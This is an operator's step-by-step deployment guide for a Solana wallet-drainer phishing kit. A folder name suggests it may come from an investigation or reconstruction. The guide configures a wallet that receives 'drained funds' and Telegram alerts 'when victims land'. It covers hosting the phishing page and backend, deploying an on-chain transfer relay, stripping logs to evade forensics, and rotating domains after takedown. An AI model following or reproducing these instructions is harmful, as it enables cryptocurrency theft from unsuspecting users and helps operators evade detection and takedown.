# Deployment Guide — Plug & Play

> **You need zero coding experience.** Edit one file, run one command, then follow the steps below.

---

## What You Need Before Starting

1. **A Solana wallet address** — this is where drained funds go (your operator wallet)
2. **A Telegram account** — for real-time notifications when victims land
3. **A Fly.io account** — free, sign up at fly.io (hosting for the backend)
4. **A Vercel account** — free, sign up at vercel.com (hosting for the front-end)
5. **A domain name** — registered through a privacy registrar (Njalla, OrangeWebsite, etc.)
6. **Node.js installed** — download from nodejs.org (just click "LTS" and install)

---

## Step 0: Edit deploy.config.json

Open `deploy.config.json` in any text editor (Notepad, TextEdit, VS Code — whatever).

Fill in these fields:

| Field | What to put |
|---|---|
| `targetWallet` | Your Solana wallet address (where funds go). Example: `CEkn...2rMR` |
| `checkWallet` | Same as targetWallet (or a separate licensing wallet) |
| `relayerWallet` | A separate disposable wallet that fronts gas fees |
| `telegramChatId` | Your Telegram channel/group ID (create a private channel, get its ID) |
| `telegramBotToken` | Token from @BotFather (message @BotFather on Telegram → /newbot → copy token) |
| `rpcEndpoint` | Use `https://api.mainnet-beta.solana.com` for testing, or a private Helius/QuickNode endpoint for production |
| `relayProgramId` | The on-chain program ID. Use the existing one for testing |
| `flyAppName` | A name for your backend on Fly.io (random letters, e.g. `skittles-7f3a`) |
| `flyRegion` | `fra` (Frankfurt), `nrt` (Tokyo), or `dfw` (Dallas) |
| `frontendDomain` | Your domain name (e.g. `mydomain.com`) |
| `vercelProjectName` | A name for your front-end on Vercel (random, e.g. `claim-portal-7f3a`) |

**Optional fields** (leave defaults if unsure):
- `operatorPercent` / `affiliatePercent` — revenue split (1.0/0.0 = you keep everything)
- `customAirdropMint` / `customAirdropAmount` — the fake token shown in the decoy
- `minWalletValue` — minimum SOL balance to trigger drain (0.1 = skip empty wallets)
- `hideChanges`, `spoofPrompt`, `useProxyForTokens` — keep these `true`
- `title`, `subtitle`, `width`, `height`, `className` — UI settings

Save the file.

---

## Step 1: Run Setup

Open a terminal (Command Prompt on Windows, Terminal on Mac):

```bash
cd C:\Users\tav08\Documents\_Sandbox\drain-investigation
node setup.js
```

This automatically:
- Generates a new AES encryption secret (so yours is unique)
- Rewrites `server/config.js` with your values + env-var fallbacks
- Patches `frame.html`, `frame.js`, `loader.js` with your wallet + keys
- Removes all request logging (forensic surface = zero)
- Kills the startup banner (was leaking wallets + keys to logs)
- Replaces error messages with generic responses (no detail leakage)
- Sets `skipPreflight: true` on relay (RPC can't log your transactions)
- Hardens the Dockerfile (non-root user, dedicated health endpoint)
- Generates `fly.toml` with your app name + region
- Generates `.env.example` with your secrets

**If you see "MISSING REQUIRED FIELDS"** — go back and fill in the fields it lists.

---

## Step 2: Install Fly.io CLI + Login

```bash
# Install Fly CLI (Windows PowerShell)
iwr https://fly.io/install.ps1 -useb | iex

# Or Mac/Linux
curl -L https://fly.io/install.sh | sh

# Login
fly auth login
```

Follow the browser prompt to sign in.

---

## Step 3: Deploy the Backend

```bash
cd server

# Create the Fly.io app (only first time)
fly apps create --name YOUR_FLY_APP_NAME

# Set secrets — copy values from .env.example
fly secrets set AES_SECRET=your_aes_secret_here
fly secrets set TARGET_WALLET=your_wallet_address_here
fly secrets set TELEGRAM_CHAT_ID=your_chat_id_here
fly secrets set TELEGRAM_BOT_TOKEN=your_bot_token_here
fly secrets set RPC_ENDPOINT=your_rpc_endpoint_here
fly secrets set CHECK_WALLET=your_check_wallet_here

# Deploy
fly deploy

# Your backend is now live at: https://YOUR_FLY_APP_NAME.fly.dev
```

**Test it:**
```bash
curl https://YOUR_FLY_APP_NAME.fly.dev/health
# Should return: 200 OK (empty body)
```

---

## Step 4: Deploy the Frontend

```bash
cd server/public

# Install Vercel CLI
npm i -g vercel

# Login
vercel login

# Deploy to production
vercel --prod
```

Vercel will give you a URL like `https://claim-portal-7f3a.vercel.app`. Test it in your browser — you should see the wallet connection page.

---

## Step 5: Connect Your Domain

Go to your domain registrar's DNS settings. Add a CNAME record:

| Type | Name | Value |
|---|---|---|
| CNAME | @ | `cname.vercel-dns.com` |
| CNAME | www | `cname.vercel-dns.com` |

Then in Vercel:
```bash
vercel domains add yourdomain.com
```

Follow the prompts to verify ownership.

---

## Step 6: Test End-to-End

1. Open your domain in a browser
2. Connect a **burner wallet** (NOT your real wallet — create a new one with `solana-keygen new`)
3. Fund it with a small amount of SOL (0.1 for testing)
4. Click "Connect Wallet" → approve in Phantom
5. Watch your Telegram channel — you should get a visitor notification
6. The drain flow will prompt you to sign — **sign with the burner wallet only**
7. Check your Telegram — you should see a confirmation with the TX ID
8. Verify on Solana Explorer that the transaction went through

---

## Step 6.5: Deploy the On-Chain Program (Relay)

The Solana program (`transfer_relay`) handles the actual token transfers on-chain.
You need to build it, test it on localnet, then deploy to mainnet.

On **Windows** it uses WSL automatically. On **Linux** it runs natively.

### One command does everything:

```bash
node relay.js
```

You'll get an interactive menu:

| Option | What it does |
|---|---|
| `1` | **Build & test on localnet** — starts a local validator, builds the program, deploys to localnet, runs integration tests, gives you Phantom testing instructions |
| `2` | **Deploy to mainnet** — builds for mainnet, checks your SOL balance, asks for confirmation, deploys the real program (costs ~1.5 SOL) |
| `3` | **Generate new program keypair** — creates a fresh program ID, patches all files (Anchor.toml, lib.rs, config.js). Use this before your first real mainnet deploy |
| `4` | **Update CHECK_WALLET** — changes the wallet address baked into the program |
| `5` | **Just build** — compiles the .so binary without deploying |

### Recommended flow for a first deployment:

```bash
# 1. Generate your own program ID (don't use the reconstruction's)
node relay.js
# → choose option 3

# 2. Build & test on localnet with Phantom
node relay.js
# → choose option 1
# → follow the Phantom testing instructions it prints

# 3. When localnet tests pass, deploy to mainnet
node relay.js
# → choose option 2
# → type "yes" to confirm (costs real SOL)
```

### What `relay.js` handles automatically:

- Detects Windows vs Linux (uses WSL on Windows)
- Checks the toolchain (Solana CLI, Anchor, Rust, Node) and tells you what's missing
- Converts your Windows path to the WSL `/mnt/c/...` path
- Forces Cargo.lock to v3 (Solana's build toolchain rejects v4)
- Runs `anchor build --no-idl` (skips the broken IDL generation step)
- Verifies the program ID is baked into the .so binary
- Starts a local validator in a separate window
- Airdrops fake SOL on localnet (unlimited, free)
- Runs the integration test suite (replays the drain flow with fake tokens)
- Checks your mainnet SOL balance before deploying
- Patches Anchor.toml, lib.rs, config.js, deploy.config.json when you generate a new keypair

### If you're on Windows and WSL isn't set up yet:

```bash
# Install WSL Ubuntu (one-time)
wsl --install -d Ubuntu
# Restart your computer, then open WSL and install the toolchain:
wsl -d Ubuntu
sh -c "$(curl -sSfL https://release.solana.com/stable/install)"
npm i -g @coral-xyz/anchor-cli
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
# Close WSL, you're done — relay.js handles the rest
```

---

## Step 7: Go Live

Once testing works:
1. Update `deploy.config.json` with your production values
2. Run `node setup.js` again
3. Redeploy: `cd server && fly deploy` and `cd server/public && vercel --prod`
4. Start driving traffic to your domain

---

## Emergency: Rotation (If You Get Flagged)

1. Register a new domain
2. Update `deploy.config.json` → `flyAppName` and `frontendDomain`
3. Run `node setup.js`
4. `fly apps create --name NEW_APP_NAME`
5. Re-set secrets (copy from `.env.example`)
6. `fly deploy`
7. `vercel --prod` (new project)
8. Point new domain CNAME to new Vercel project
9. Abandon old infrastructure — don't delete it, just let it expire

---

## Troubleshooting

| Problem | Fix |
|---|---|
| `setup.js` says "MISSING REQUIRED FIELDS" | Fill in all fields marked `YOUR_` in deploy.config.json |
| Frontend loads but wallet won't connect | Check that `API_BASE` in frame.js points to your Fly.io URL |
| No Telegram notifications | Check `fly secrets list` — ensure TELEGRAM_BOT_TOKEN is set |
| Drain fails / transaction rejected | Ensure relayer wallet has enough SOL for gas fees |
| `fly deploy` fails | Ensure you're logged in (`fly auth login`) and the app exists (`fly apps create`) |
| `vercel --prod` fails | Ensure you're logged in (`vercel login`) |

---

## File Reference

| File | What it does | You touch it? |
|---|---|---|
| `deploy.config.json` | The ONE config file you edit | ✅ Yes |
| `setup.js` | Interactive CLI — configures everything | ❌ Never |
| `relay.js` | Interactive CLI — builds, tests, deploys the on-chain program | ❌ Never |
| `DEPLOY.md` | This guide | ❌ Never |
| `.env.example` | Reference for Fly.io secrets | ❌ Never (use `fly secrets set`) |
| `server/config.js` | Server config (auto-generated) | ❌ Auto |
| `server/server.js` | Backend API server | ❌ Auto |
| `server/public/frame.html` | Phishing page | ❌ Auto |
| `server/public/frame.js` | Client drain logic | ❌ Auto |
| `server/public/loader.js` | Page loader | ❌ Auto |
| `server/fly.toml` | Fly.io deployment config | ❌ Auto |
| `server/Dockerfile` | Container image | ❌ Auto |
| `programs/transfer-relay/src/lib.rs` | On-chain Solana program | ❌ Auto (relay.js patches it) |
